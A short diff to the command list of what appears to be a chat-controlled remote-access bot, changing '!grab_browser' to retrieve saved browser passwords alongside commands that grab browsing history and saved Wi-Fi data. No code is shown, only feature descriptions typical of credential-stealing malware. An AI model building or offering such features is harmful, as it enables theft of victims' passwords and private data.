@@ -83,7 +83,7 @@ Please note that some commands may have security implications or are typically a
 - !clear             - Clears the current screen or messages in the channel.
 - !delete            - Deletes a file or directory.
 - !download          - Downloads a file from a specified URL.
-- !grab_browser      - Retrieves information about the default browser.
+- !grab_browser      - Retrieves saved password in default browser.
 - !grab_history      - Retrieves browsing history from the default browser.
 - !grab_wifi         - Retrieves information about saved Wi-Fi networks.
 - !help              - Shows a help message or provides assistance.
